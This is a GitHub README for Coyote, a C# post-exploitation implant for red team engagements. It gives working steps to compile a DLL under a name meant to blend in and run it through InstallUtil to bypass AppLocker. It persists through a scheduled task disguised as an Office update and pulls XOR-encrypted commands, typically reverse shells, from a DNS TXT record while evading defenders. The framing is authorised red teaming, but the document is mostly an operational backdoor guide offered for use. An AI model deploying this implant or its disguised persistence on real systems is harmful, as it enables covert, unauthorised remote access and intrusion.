# Coyote

Coyote is a standalone C# post-exploitation implant for maintaining access to compromised Windows infrastructure during red team engagements.

* Bypasses application whitelisting (eg AppLocker) using InstallUtil.exe (see [MITRE ATT&CK ID: T1218.004](https://attack.mitre.org/techniques/T1218/004/))
* Retrieves encrypted commands from operator via recursive DNS tunnel (see [MITRE ATT&CK ID: T1071.004](https://attack.mitre.org/techniques/T1071/004/))
* Small footprint in memory and on the network

The basic premise is for the red team to leave this tiny DLL behind on a compromised Windows system and have it occasionally poll the DNS TXT record of a legitimate looking FQDN to check for instructions. When needed, the TXT record can contain a simple powershell one liner to spawn an interactive reverse shell out to a VPS, or the first stage of something more sophisticated, as per the operator's requirements. Coyote is not used for interactive control of the compromised system, rather to maintain access and spawn some other tool (a reverse shell, meterpreter etc) as required.

### Usage

First of all edit the coyote.cs source file and set the c2domain variable to the subdomain you will be using for your TXT record.

To compile it on your own Windows box: 

`C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:msoffice360.dll coyote.cs`

This will create a small DLL file of approximately 5 KB called msoffice360.dll (use whatever filename you think will blend in on the target) which you will place on the target system.

To execute it once on the target workstation or server: 

`C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U msoffice360.dll`

For it to be useful, Coyote needs to get executed repeatedly at some interval such as every 24 hours or upon each reboot. There are many ways to achieve this. See [PayloadsAllTheThings - Windows Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md) for a long list of techniques and pick one.

One way that will serve as an example is to hide the DLL in a user's AppData folder and then simply create a new scheduled task:

`schtasks /CREATE /SC DAILY /TN "Microsoft Office security updates task" /TR "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\Olivia\AppData\Local\Microsoft\msoffice360.dll" /ST 08:00`

This means that every day at 0800 the built-in InstallUtil.exe will import and run the DLL's uninstall function, which will then do a recursive DNS lookup to check if a command is currently encoded in the TXT record, and if so execute it. This can hopefully remain undetected by the blue team until needed and act as a backup to any other methods being used to maintain remote access to the network.

To leave a command to be executed (generally this will be used to spawn an interactive reverse shell), use the included encrypt-payload.ps1 powershell script. Give it the exact string that you would have typed into the command line and copy the encrypted output into a TXT record on the subdomain that you set when you compiled the implant. Next time the implant calls home the TXT record will be decrypted and executed. Any network security product that happens to be examining DNS traffic (many networks don't even do this at all) will not be able to see the raw payload on the wire.

### Proof-of-concept

We use the encrypt-payload.ps1 powershell script to XOR our payload of "calc.exe" with our key of "pizza" and base64 encode the result: 

![Coyote payload encryption screenshot](https://github.com/TartarusLabs/Coyote/blob/main/screenshot2.jpg?raw=true)

Using the output of the powershell script we create a TXT record on our DNS server as follows:

`updates.tartaruslabs.com	TXT	EwgWGU8VER8=	7200`

It is best to set a fairly low TTL so that you don't have to wait too long each time you modify the TXT record for it to be dropped from the cache on the compromised network's own DNS server and refreshed from the authoritative DNS server. In this case we set the TTL to 7200 seconds, or 2 hours.

This record is saved and from a Linux laptop we then confirm it is active:

`user@laptop:~$ host -t txt updates.tartaruslabs.com`

`updates.tartaruslabs.com descriptive text "EwgWGU8VER8="`

In coyote.cs we set the value of c2domain to "updates.tartaruslabs.com" and XORkey to "pizza" then compile it on our Windows VM.

We execute the implant and sure enough calculator opens. 

![Coyote screenshot](https://github.com/TartarusLabs/Coyote/blob/main/screenshot.jpg?raw=true)

### Contributing

Contributions from the community to improve this tool are welcome. 

If you are unsure whether your proposed change is likely to be accepted feel free to post your idea on the Issues page and we can discuss it before you do the work of implementing it.

In order to contribute your additions to the code please follow the standard process:

* Fork this repo to your own GitHub account and then clone that to your local system.
* Create a new branch to work on.
* Make, test and commit your intended changes.
* Push your changes to your fork.
* Submit a pull request to me.

For a detailed step-by-step guide see [first-contributions](https://github.com/firstcontributions/first-contributions)

Feature requests and bug reports are also welcome and can be posted on the Issues page.
